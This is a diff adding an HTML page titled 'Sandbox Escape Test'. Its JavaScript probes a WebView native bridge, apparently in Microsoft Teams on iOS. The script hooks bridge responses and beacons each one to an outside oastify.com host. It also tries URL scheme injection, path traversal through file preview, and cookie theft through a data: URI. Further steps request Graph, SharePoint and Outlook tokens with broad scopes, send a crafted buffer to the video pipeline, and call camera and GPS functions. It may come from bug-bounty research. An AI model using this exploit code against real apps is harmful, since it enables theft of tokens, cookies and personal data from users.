@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Sandbox Escape Test</title></head>
+<body>
+<pre id="log">Sandbox escape probe starting...</pre>
+<script>
+(function() {
+    var OAST = 'evdp68139eplrgvmed2cwlvfh6nxb0zp.oastify.com';
+    var L = document.getElementById('log');
+    var NI = window.nativeInterface;
+
+    function log(msg) {
+        L.textContent += '\n' + msg;
+    }
+
+    function exfil(tag, data) {
+        var d = typeof data === 'string' ? data : JSON.stringify(data);
+        new Image().src = 'https://' + OAST + '/?t=' + tag + '&d=' + encodeURIComponent(d.substring(0, 2000)) + '&ts=' + Date.now();
+    }
+
+    if (!NI) {
+        log('ERROR: nativeInterface not available');
+        exfil('sandbox_no_ni', 'nativeInterface missing');
+        return;
+    }
+
+    exfil('sandbox_test_start', 'NI props: ' + Object.getOwnPropertyNames(NI).length);
+    log('NI available with ' + Object.getOwnPropertyNames(NI).length + ' props');
+
+    // =============================================
+    // RESPONSE INTERCEPTORS
+    // =============================================
+
+    var origHR = NI.handleResponseFromNative;
+    NI.handleResponseFromNative = function(response, requestId) {
+        exfil('sandbox_raw_resp_' + requestId, response);
+        log('[RAW ' + requestId + '] ' + String(response).substring(0, 200));
+        if (origHR) return origHR.apply(NI, arguments);
+    };
+
+    var origNM = window.onNativeMessage;
+    window.onNativeMessage = function(evt) {
+        var data = evt && evt.data ? evt.data : evt;
+        var funcName = data && data.func ? data.func : 'unknown';
+        var id = data && data.id !== undefined ? data.id : 'noid';
+        exfil('sandbox_nm_' + id, data);
+        log('[NM ' + id + ' ' + funcName + '] ' + JSON.stringify(data).substring(0, 200));
+        if (origNM) return origNM.call(window, evt);
+    };
+
+    // =============================================
+    // SECTION 1: executeDeepLink — URL SCHEME INJECTION
+    // Tests if native calls UIApplication.shared.open() with arbitrary schemes
+    // =============================================
+
+    var deepLinkTests = [
+        // Telephony — auto-dial proves arbitrary scheme execution
+        [2001, 'deeplink_tel',         'tel:+15551234567'],
+        [2002, 'deeplink_telprompt',   'telprompt:+15551234567'],
+
+        // Mail composition — data exfil via email
+        [2003, 'deeplink_mailto',      'mailto:test@example.com?subject=sandbox_escape&body=proof'],
+
+        // iOS Shortcuts — arbitrary code execution
+        [2004, 'deeplink_shortcuts',   'shortcuts://x-callback-url/run-shortcut?name=TestShortcut&input=text&text=pwned'],
+
+        // Enterprise app install — RCE via malicious IPA
+        [2005, 'deeplink_itms',        'itms-services://?action=download-manifest&url=https://example.com/manifest.plist'],
+
+        // Self-referential Teams deeplink — navigate within Teams
+        [2006, 'deeplink_msteams',     'msteams://teams.microsoft.com/l/chat/0/0?users=test@example.com&message=sandbox_escape_test'],
+
+        // Open in other Microsoft apps with controlled content
+        [2007, 'deeplink_outlook',     'ms-outlook://compose?to=test@example.com&subject=escape&body=proof'],
+        [2008, 'deeplink_word',        'ms-word://ofe/https://example.com/malicious.docx'],
+        [2009, 'deeplink_excel',       'ms-excel://ofe/https://example.com/malicious.xlsx'],
+
+        // JavaScript URI — if opened in WebView = XSS in native context
+        [2010, 'deeplink_javascript',  'javascript:void(document.title)'],
+
+        // Data URI — load arbitrary HTML
+        [2011, 'deeplink_data',        'data:text/html,<h1>sandbox_escape</h1>'],
+
+        // File URI — local file read
+        [2012, 'deeplink_file',        'file:///etc/hosts'],
+        [2013, 'deeplink_file_app',    'file:///var/mobile/Containers/Data/Application/'],
+
+        // Company Portal / Intune — privilege escalation
+        [2014, 'deeplink_portal',      'companyportal://enrollment'],
+
+        // Edge browser — open URL as authenticated user
+        [2015, 'deeplink_edge',        'microsoft-edge-https://attacker.example.com/steal'],
+
+        // ms-apps — internal Microsoft app protocol
+        [2016, 'deeplink_msapps',      'ms-apps://test'],
+    ];
+
+    log('\n=== SECTION 1: executeDeepLink URL Scheme Injection ===');
+    deepLinkTests.forEach(function(t) {
+        var id = t[0], name = t[1], url = t[2];
+        exfil('sandbox_trying_' + name, url);
+        NI.framelessPostMessage(JSON.stringify({
+            func: 'executeDeepLink',
+            id: id,
+            args: [url]
+        }));
+        log('  Sent: ' + name + ' → ' + url);
+    });
+
+    // =============================================
+    // SECTION 2: openFilePreview — PATH TRAVERSAL + SCHEME INJECTION
+    // Tests if native downloads/opens files at attacker-controlled paths
+    // args: [?, fileName, ?, fileType, fileUrl, fileDownloadUrl]
+    // =============================================
+
+    log('\n=== SECTION 2: openFilePreview Path Traversal ===');
+
+    var fileTests = [
+        // Path traversal in fileName — write to app container
+        [3001, 'filepreview_traversal_lib',
+            ['docId', '../../Library/Caches/evil.html', null, 'html',
+             'https://example.com/file.html', 'https://example.com/file.html']],
+
+        // Path traversal targeting WebKit data
+        [3002, 'filepreview_traversal_webkit',
+            ['docId', '../../Library/WebKit/evil.js', null, 'js',
+             'https://example.com/evil.js', 'https://example.com/evil.js']],
+
+        // File scheme in fileDownloadUrl — read local files
+        [3003, 'filepreview_file_scheme',
+            ['docId', 'test.txt', null, 'txt',
+             'file:///etc/hosts', 'file:///etc/hosts']],
+
+        // File scheme targeting app's own data
+        [3004, 'filepreview_file_appdata',
+            ['docId', 'test.txt', null, 'txt',
+             'file:///var/mobile/Containers/Data/Application/', 'file:///var/mobile/Containers/Data/Application/']],
+
+        // JavaScript URL in fileUrl — exec in file preview WebView
+        [3005, 'filepreview_js_fileurl',
+            ['docId', 'test.html', null, 'html',
+             'javascript:void(0)', 'https://example.com/file.html']],
+
+        // JavaScript URL in fileDownloadUrl
+        [3006, 'filepreview_js_download',
+            ['docId', 'test.html', null, 'html',
+             'https://example.com/file.html', 'javascript:void(0)']],
+
+        // Data URI as download URL — inject HTML content
+        [3007, 'filepreview_data_download',
+            ['docId', 'injected.html', null, 'html',
+             'https://example.com', 'data:text/html,<scr'+'ipt>alert(1)<\/scr'+'ipt>']],
+
+        // Null byte in fileName — bypass extension checks
+        [3008, 'filepreview_nullbyte',
+            ['docId', 'safe.txt\x00.html', null, 'html',
+             'https://example.com/file.html', 'https://example.com/file.html']],
+
+        // Type confusion — HTML type with attacker URL
+        [3009, 'filepreview_type_html',
+            ['docId', 'malicious.html', null, 'html',
+             'https://example.com/payload.html', 'https://example.com/payload.html']],
+    ];
+
+    fileTests.forEach(function(t) {
+        var id = t[0], name = t[1], args = t[2];
+        exfil('sandbox_trying_' + name, args);
+        NI.framelessPostMessage(JSON.stringify({
+            func: 'openFilePreview',
+            id: id,
+            args: args
+        }));
+        log('  Sent: ' + name);
+    });
+
+    // =============================================
+    // SECTION 3: navigateCrossDomain — WEBVIEW HIJACK
+    // If native loads this URL in the same WebView with bridge access,
+    // attacker gains persistent control of the native bridge
+    // =============================================
+
+    log('\n=== SECTION 3: navigateCrossDomain WebView Hijack ===');
+
+    var navTests = [
+        // Attacker-controlled HTTPS page
+        [4001, 'nav_attacker_https',   'https://example.com/teams-hijack'],
+
+        // JavaScript URI in cross-domain nav
+        [4002, 'nav_javascript',       'javascript:void(document.cookie)'],
+
+        // Data URI
+        [4003, 'nav_data',             'data:text/html,<scr'+'ipt>new Image().src="https://' + OAST + '/?t=nav_exec&d="+document.cookie<\/scr'+'ipt>'],
+
+        // File URI — load local file in WebView
+        [4004, 'nav_file',             'file:///etc/hosts'],
+
+        // About:blank — test if WebView retains bridge
+        [4005, 'nav_about',            'about:blank'],
+
+        // Teams internal URL — might load with elevated permissions
+        [4006, 'nav_teams_internal',   'https://teams.microsoft.com/_#/apps'],
+    ];
+
+    navTests.forEach(function(t) {
+        var id = t[0], name = t[1], url = t[2];
+        exfil('sandbox_trying_' + name, url);
+        NI.framelessPostMessage(JSON.stringify({
+            func: 'navigateCrossDomain',
+            id: id,
+            args: [url]
+        }));
+        log('  Sent: ' + name + ' → ' + url.substring(0, 80));
+    });
+
+    // =============================================
+    // SECTION 4: authentication.authenticate — POPUP WITH BRIDGE
+    // Opens auth popup at attacker URL; popup has full NI access (confirmed)
+    // =============================================
+
+    log('\n=== SECTION 4: authentication.authenticate Popup Hijack ===');
+
+    // Open attacker URL in auth popup — popup has NI + webkit bridge
+    NI.framelessPostMessage(JSON.stringify({
+        func: 'authentication.authenticate',
+        id: 5001,
+        args: [JSON.stringify({
+            url: 'https://example.com/auth-hijack?oast=' + OAST,
+            width: 600,
+            height: 400,
+            isExternal: false
+        }), null, null, false]
+    }));
+    exfil('sandbox_trying_auth_popup', 'auth popup with attacker URL');
+    log('  Sent: auth.authenticate with attacker URL');
+
+    // =============================================
+    // SECTION 5: DIRECT webkit.messageHandlers — BYPASS JSWebModule
+    // These bypass the JS bridge layer entirely and talk to native directly
+    // =============================================
+
+    log('\n=== SECTION 5: Direct webkit.messageHandlers ===');
+
+    if (window.webkit && window.webkit.messageHandlers) {
+        var handlers = window.webkit.messageHandlers;
+
+        // Direct executeDeepLink to native
+        if (handlers.listener) {
+            try {
+                handlers.listener.postMessage({
+                    event: 'executeDeepLink',
+                    requestId: 6001,
+                    resource: 'shortcuts://x-callback-url/run-shortcut?name=Test'
+                });
+                exfil('sandbox_direct_deeplink', 'sent via webkit.listener');
+                log('  Direct webkit: executeDeepLink shortcuts://');
+            } catch(e) {
+                exfil('sandbox_direct_deeplink_err', String(e));
+                log('  Direct webkit executeDeepLink error: ' + e);
+            }
+
+            // Direct navigateCrossDomain to native
+            try {
+                handlers.listener.postMessage({
+                    event: 'navigateCrossDomain',
+                    requestId: 6002,
+                    resource: 'https://example.com/direct-nav-hijack'
+                });
+                exfil('sandbox_direct_nav', 'sent via webkit.listener');
+                log('  Direct webkit: navigateCrossDomain');
+            } catch(e) {
+                exfil('sandbox_direct_nav_err', String(e));
+            }
+
+            // Direct openFilePreview to native
+            try {
+                handlers.listener.postMessage({
+                    event: 'openFilePreview',
+                    requestId: 6003,
+                    fileDownloadUrl: 'file:///etc/hosts',
+                    fileName: '../../Library/evil.html',
+                    fileType: 'html',
+                    fileUrl: 'file:///etc/hosts'
+                });
+                exfil('sandbox_direct_filepreview', 'sent via webkit.listener');
+                log('  Direct webkit: openFilePreview file://');
+            } catch(e) {
+                exfil('sandbox_direct_filepreview_err', String(e));
+            }
+
+            // Try to get Fluid token (internal service)
+            try {
+                handlers.listener.postMessage({
+                    event: 'interactive.getFluidToken',
+                    requestId: 6004,
+                    containerId: 'attacker-container-id'
+                });
+                exfil('sandbox_direct_fluid', 'sent via webkit.listener');
+                log('  Direct webkit: getFluidToken');
+            } catch(e) {
+                exfil('sandbox_direct_fluid_err', String(e));
+            }
+
+            // Try to get tenant info
+            try {
+                handlers.listener.postMessage({
+                    event: 'interactive.getFluidTenantInfo',
+                    requestId: 6005
+                });
+                exfil('sandbox_direct_tenant', 'sent via webkit.listener');
+                log('  Direct webkit: getFluidTenantInfo');
+            } catch(e) {
+                exfil('sandbox_direct_tenant_err', String(e));
+            }
+        }
+
+        // Try callbackHandler (used by pptViewer — separate privilege domain)
+        if (handlers.callbackHandler) {
+            try {
+                handlers.callbackHandler.postMessage({event: 'initialize'});
+                exfil('sandbox_callbackhandler', 'callbackHandler available!');
+                log('  Direct webkit: callbackHandler.initialize');
+            } catch(e) {
+                exfil('sandbox_callbackhandler_err', String(e));
+                log('  callbackHandler: ' + e);
+            }
+        } else {
+            exfil('sandbox_no_callbackhandler', 'not available');
+            log('  callbackHandler: not available');
+        }
+
+        // Enumerate all available messageHandlers
+        try {
+            var handlerNames = Object.getOwnPropertyNames(handlers);
+            exfil('sandbox_all_handlers', handlerNames);
+            log('  Available handlers: ' + handlerNames.join(', '));
+        } catch(e) {
+            exfil('sandbox_handlers_enum_err', String(e));
+        }
+    }
+
+    // =============================================
+    // SECTION 6: nestedAppAuthBridge — CROSS-APP TOKEN ACCESS
+    // If we can get tokens for other app clientIds, it's a broader compromise
+    // =============================================
+
+    log('\n=== SECTION 6: NAA Bridge Cross-App Tokens ===');
+
+    if (window.nestedAppAuthBridge) {
+        var naaTargets = [
+            // Teams own clientId
+            ['1fec8e78-bce4-4aaf-ab1b-5451cc387264', 'User.Read openid profile offline_access'],
+            // Microsoft Graph first-party
+            ['00000003-0000-0000-c000-000000000000', 'User.Read Mail.Read'],
+            // SharePoint
+            ['00000003-0000-0ff1-ce00-000000000000', 'AllSites.FullControl'],
+            // Outlook
+            ['00000002-0000-0ff1-ce00-000000000000', 'full_access_as_user'],
+            // Azure AD Graph
+            ['00000002-0000-0000-c000-000000000000', 'Directory.ReadWrite.All'],
+        ];
+
+        window.nestedAppAuthBridge.addEventListener('message', function(resp) {
+            exfil('sandbox_naa_resp', resp);
+            log('[NAA] ' + String(resp).substring(0, 200));
+        });
+
+        naaTargets.forEach(function(t, i) {
+            try {
+                window.nestedAppAuthBridge.postMessage(JSON.stringify({
+                    messageType: 'NestedAppAuthRequest',
+                    method: 'GetToken',
+                    requestId: 'sandbox-naa-' + i + '-' + Date.now(),
+                    clientId: t[0],
+                    scope: t[1],
+                    correlationId: 'sandbox-corr-' + i
+                }));
+                exfil('sandbox_naa_sent_' + i, 'clientId: ' + t[0]);
+                log('  NAA token request: ' + t[0]);
+            } catch(e) {
+                exfil('sandbox_naa_err_' + i, String(e));
+            }
+        });
+    } else {
+        log('  NAA bridge: not available');
+    }
+
+    // =============================================
+    // SECTION 7: VIDEO FRAME — NATIVE BUFFER MANIPULATION
+    // Tests if we can send crafted binary data to native video pipeline
+    // =============================================
+
+    log('\n=== SECTION 7: Video Frame Buffer Probe ===');
+
+    if (NI.videoExtHandler) {
+        exfil('sandbox_video_handler', 'videoExtHandler available');
+        log('  videoExtHandler available');
+
+        // Try to send crafted buffer
+        try {
+            var maliciousBuf = new ArrayBuffer(65536);
+            var view = new Uint8Array(maliciousBuf);
+            // Fill with pattern that might trigger overflow
+            for (var i = 0; i < view.length; i++) view[i] = 0x41;
+            // Set header bytes to crafted values
+            view[0] = 0xFF; view[1] = 0xFF; view[2] = 0xFF; view[3] = 0xFF;
+
+            NI.videoExtHandler.arrayBuffer = maliciousBuf;
+            NI.videoExtHandler.deliverToNative();
+            exfil('sandbox_video_sent', 'sent 64KB crafted buffer');
+            log('  Sent crafted 64KB buffer to native video pipeline');
+        } catch(e) {
+            exfil('sandbox_video_err', String(e));
+            log('  Video buffer error: ' + e);
+        }
+    } else {
+        exfil('sandbox_no_video', 'videoExtHandler not available');
+        log('  videoExtHandler: not available');
+    }
+
+    // =============================================
+    // SECTION 8: ADDITIONAL BRIDGE FUNCTIONS — DATA EXFIL
+    // =============================================
+
+    log('\n=== SECTION 8: Additional Bridge Function Probes ===');
+
+    // getUserJoinedTeams — org data exfil
+    NI.framelessPostMessage(JSON.stringify({
+        func: 'getUserJoinedTeams',
+        id: 8001,
+        args: ['']
+    }));
+    exfil('sandbox_getUserJoinedTeams', 'sent');
+    log('  getUserJoinedTeams');
+
+    // selectMedia — access camera/mic
+    NI.framelessPostMessage(JSON.stringify({
+        func: 'selectMedia',
+        id: 8002,
+        args: [JSON.stringify({
+            mediaType: 1,
+            maxMediaCount: 1,
+            imageProps: {sources: [1, 2]}
+        })]
+    }));
+    exfil('sandbox_selectMedia', 'camera access attempt');
+    log('  selectMedia (camera)');
+
+    // captureImage — screenshot/photo
+    NI.framelessPostMessage(JSON.stringify({
+        func: 'captureImage',
+        id: 8003,
+        args: []
+    }));
+    exfil('sandbox_captureImage', 'sent');
+    log('  captureImage');
+
+    // location.getLocation — GPS tracking
+    NI.framelessPostMessage(JSON.stringify({
+        func: 'location.getLocation',
+        id: 8004,
+        args: [JSON.stringify({allowChooseLocation: false, showMap: false})]
+    }));
+    exfil('sandbox_getLocation', 'GPS access attempt');
+    log('  getLocation (GPS)');
+
+    // scanBarCode — camera access
+    NI.framelessPostMessage(JSON.stringify({
+        func: 'media.scanBarCode',
+        id: 8005,
+        args: [JSON.stringify({timeOutIntervalInSec: 5})]
+    }));
+    exfil('sandbox_scanBarCode', 'barcode scan attempt');
+    log('  scanBarCode (camera)');
+
+    // changeWhiteboardUrl — inject attacker URL in whiteboard context
+    NI.framelessPostMessage(JSON.stringify({
+        func: 'changeWhiteboardUrl',
+        id: 8006,
+        args: ['https://example.com/whiteboard-hijack']
+    }));
+    exfil('sandbox_changeWhiteboard', 'sent');
+    log('  changeWhiteboardUrl');
+
+    // =============================================
+    // SECTION 9: ENUMERATE ALL NI PROPERTIES
+    // Check for undocumented methods that might allow escape
+    // =============================================
+
+    log('\n=== SECTION 9: NI Property Enumeration ===');
+
+    try {
+        var props = Object.getOwnPropertyNames(NI);
+        var propInfo = {};
+        props.forEach(function(p) {
+            try {
+                propInfo[p] = typeof NI[p];
+            } catch(e) {
+                propInfo[p] = 'error: ' + e;
+            }
+        });
+        exfil('sandbox_ni_props', propInfo);
+        log('  NI properties: ' + JSON.stringify(propInfo).substring(0, 500));
+
+        // Check for methods we haven't tested
+        props.forEach(function(p) {
+            if (typeof NI[p] === 'function' &&
+                p !== 'framelessPostMessage' &&
+                p !== 'handleResponseFromNative') {
+                exfil('sandbox_ni_func_' + p, 'type: function');
+                log('  Undocumented NI function: ' + p);
+            }
+        });
+    } catch(e) {
+        exfil('sandbox_ni_enum_err', String(e));
+    }
+
+    // =============================================
+    // SECTION 10: PROTOTYPE POLLUTION / PROPERTY OVERRIDE
+    // Can we override NI methods to intercept ALL future native calls?
+    // =============================================
+
+    log('\n=== SECTION 10: Bridge Persistence Check ===');
+
+    // Check if we can read the original page's registered callbacks
+    if (window.teams && window.teams.messageHandlers) {
+        var tm = window.teams.messageHandlers;
+        try {
+            var tmProps = Object.getOwnPropertyNames(tm);
+            exfil('sandbox_teams_mh_props', tmProps);
+            log('  teams.messageHandlers props: ' + tmProps.join(', '));
+
+            if (tm.callbacks) {
+                var cbKeys = Object.keys(tm.callbacks);
+                exfil('sandbox_callbacks', cbKeys);
+                log('  Registered callbacks: ' + cbKeys.join(', '));
+            }
+            if (tm.handlers) {
+                var hKeys = Object.keys(tm.handlers);
+                exfil('sandbox_handlers', hKeys);
+                log('  Registered handlers: ' + hKeys.join(', '));
+            }
+        } catch(e) {
+            exfil('sandbox_teams_mh_err', String(e));
+        }
+    }
+
+    log('\n=== All probes sent. Waiting for responses... ===');
+    exfil('sandbox_test_complete', 'all ' + (deepLinkTests.length + fileTests.length + navTests.length) + ' probes sent');
+
+})();
+</script>
+</body>
+</html>
